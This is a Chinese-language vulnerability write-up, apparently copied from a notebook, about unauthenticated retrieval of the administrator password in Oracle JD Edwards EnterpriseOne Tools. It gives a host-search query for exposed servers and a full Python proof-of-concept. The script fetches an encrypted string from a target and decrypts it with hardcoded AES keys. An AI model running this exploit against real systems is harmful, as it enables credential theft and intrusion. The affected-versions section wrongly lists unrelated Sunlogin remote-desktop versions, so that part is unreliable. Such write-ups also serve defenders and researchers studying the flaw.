# Oracle JDEdwards EnterpriseOne Tools存在未授权获取管理员密码漏洞

## 一、漏洞描述
Oracle JDEdwards EnterpriseOne Tools存在未授权获取管理员密码漏洞

## 二、影响版本
+ 向日葵个人版 for Windows <=11.0.0.33162版本
+ 向日葵简约版 <= V1.0.1.43315（2021.12）

## 三、漏洞测绘
```java
port:8999 product:"Oracle WebLogic Server"
```

![1724335620619-317416d9-24aa-4545-bad4-a3067a469dc3.png](./img/ijf-qz3AGTo6YYJz/1724335620619-317416d9-24aa-4545-bad4-a3067a469dc3-184659.png)

## 四、漏洞复现
![1724335643682-e9e0b518-1460-4da8-8273-2df3d3a1a767.png](./img/ijf-qz3AGTo6YYJz/1724335643682-e9e0b518-1460-4da8-8273-2df3d3a1a767-754624.png)

使用下面解密脚本解密

```java
python3 poc.py --string ACHCJKFKHCJKKKJJIBBOCDPIHOEJIICHDGHGJEBABEAG
```

![1724335765028-42f80ff5-85e2-4f31-a6f9-70dfbbb2151c.png](./img/ijf-qz3AGTo6YYJz/1724335765028-42f80ff5-85e2-4f31-a6f9-70dfbbb2151c-572268.png)

```java
import base64
import argparse
import subprocess
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def main():
    # Display ASCII art
    print("""
       ______   ______    ___  ___  ___  ___      ___ ________ ____
      / ___/ | / / __/___|_  |/ _ \|_  |/ _ \____|_  /_  /_  /|_  /
     / /__ | |/ / _//___/ __// // / __// // /___/ __/ / //_ <_/_ < 
     \___/ |___/___/   /____/\___/____/\___/   /____//_/____/____/ 
    """)

    # Parse command-line arguments
    parser = argparse.ArgumentParser(description='Decrypt a given string.')
    parser.add_argument('--string', help='The string to be decrypted')
    parser.add_argument('--target', help='The target URL to fetch the string from')
    args = parser.parse_args()

    if args.target:
        # Fetch the response from the target URL
        response = fetch_target_string_with_curl(args.target)
        if response:
            input_str = response
            print(f"Fetched string from target: {input_str}")
        else:
            print("No valid string found in the response.")
            return
    elif args.string:
        input_str = args.string
    else:
        print("You must provide either --string or --target.")
        return

    # Decrypt the string
    array_of_bytes = jde_decipher(input_str.encode("UTF-8"))
    print("Decrypted string:", array_of_bytes.decode("UTF-8"))

def fetch_target_string_with_curl(target_url):
    try:
        # Use curl to fetch the target URL with SSL verification disabled
        result = subprocess.run(['curl', '-k', target_url], capture_output=True, text=True)
        if result.returncode == 0:
            response_text = result.stdout.strip()
            print("Response received:")
            print(response_text)  # Print for debugging
            return response_text
        else:
            print(f"curl failed with return code {result.returncode}")
            return None
    except Exception as e:
        print(f"Failed to fetch from target using curl: {e}")
        return None

def jde_decipher(param_array_of_bytes):
    array_of_bytes_1 = show_buffer(param_array_of_bytes)
    array_of_bytes_2 = base64.b64decode(array_of_bytes_1)
    return array_of_bytes_2

def show_buffer(param_array_of_bytes):
    array_of_bytes_1 = bytearray(len(param_array_of_bytes) // 2)
    for j in range(len(array_of_bytes_1)):
        i = 2 * j
        array_of_bytes_1[j] = ((param_array_of_bytes[i] - 65) << 4) + (param_array_of_bytes[i + 1] - 65)

    if array_of_bytes_1[0] != 2:
        raise Exception("Invalid version for net showBuffer")

    array_of_bytes_2 = bytearray(16)
    array_of_bytes_3 = bytearray(16)
    gen_keys(array_of_bytes_2, array_of_bytes_3, array_of_bytes_1[3])

    cipher = AES.new(array_of_bytes_2, AES.MODE_CBC, iv=array_of_bytes_3)
    array_of_bytes_4 = unpad(cipher.decrypt(bytes(array_of_bytes_1[6:])), AES.block_size)

    return array_of_bytes_4

def gen_keys(param_array_of_bytes_1, param_array_of_bytes_2, param_byte):
    array_of_bytes_1 = bytearray([65, 4, 95, 12, 88, 41, 6, 114, 119, 93, 37, 68, 75, 19, 49, 46])
    array_of_bytes_2 = bytearray([107, 34, 26, 94, 68, 41, 119, 48, 3, 88, 28, 97, 5, 127, 77, 54])
    array_of_bytes_3 = bytearray([36, 89, 113, 109, 38, 15, 7, 66, 76, 115, 16, 53, 106, 94, 27, 56])

    j = param_byte >> 4
    k = param_byte & 0xF
    m = array_of_bytes_3[j]
    for i in range(16):
        param_array_of_bytes_1[i] = array_of_bytes_1[i] ^ m

    m = array_of_bytes_3[k]
    for i in range(16):
        param_array_of_bytes_2[i] = array_of_bytes_2[i] ^ m

if __name__ == "__main__":
    main()
```



> 更新: 2024-09-05 23:27:57  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/pmvkhnz91qoo3axw>